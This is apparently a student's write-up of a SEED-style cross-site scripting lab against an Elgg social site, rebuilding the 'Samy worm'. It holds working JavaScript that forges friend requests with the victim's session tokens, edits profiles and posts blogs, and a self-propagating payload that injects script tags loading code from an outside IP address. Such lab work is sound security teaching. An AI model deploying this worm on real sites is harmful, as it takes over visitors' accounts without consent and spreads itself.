# Setup
In this assignment I am creating a server using node js and express. By the help of express I am broadcasting some scripts. By the following code snippet the script_{id}.js is recieved by the victim who is visiting Samy´s profile and the code in the script_{id}.js is executed in his browser.
```html
<script type=text/javascript src=http://20.249.212.251:3030/script_{id}.js></script>
```
The above code is in the description of Samy´s profile.

# Task 1
In this task I have to make the victim send a friend request to Samy while visiting Samy´s profile. To achieve the goal I first observed the requests sent while friend request is sent. I copied the url. I also have to gather the __elgg_ts and __elgg_token values that I get from elgg object. I used string interpolation to generate the request url and use fetch method to trigger the request.

```javascript
const script_1 = async () => { await fetch(`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}`); }
```

# Task 2
In this task I have to make some changes in the victim´s profile. So my approach was as usual. I observed the requests sent while updating profile. Copy the url and request payload. Build my form data body. Create the option object for fetch function and hit the server.

```javascript
    if (elgg.session.user.guid != 59) {
        await fetch(url, {
            method: `POST`,
            body: formData
        })
    }
```
There was a challenge to make the worm functional in such a way that the attacker don´t get damaged by the worm. So I checked before hitting the server that the user is Samy or not. 

# Task 3
This task was similar to task 2. I just observed the sites behavior on posting a blog. Figure out the form body format. Built a similar form data and call the fetch function with appropriate options object.

# Task 4
In task 2 I changed user profile. While changing user profile I set description field by my department Id with script links in the following way,
```javascript
    const link_1=`<script type=text/javascript src=http://20.249.212.251:3030/script_1.js></script>`
    const link_2=`<script type=text/javascript src=http://20.249.212.251:3030/script_2.js></script>`
    const link_3=`<script type=text/javascript src=http://20.249.212.251:3030/script_3.js></script>`
    const link=`<script type=text/javascript src=http://20.249.212.251:3030/script.js></script>`

    formData.set(`description`, `<p>1805066</p>${link}${link_1}${link_2}${link_3}`);
```
Thus the bad scripts become linked with our next victim who visit Samy´s profile or any of the previous victims.
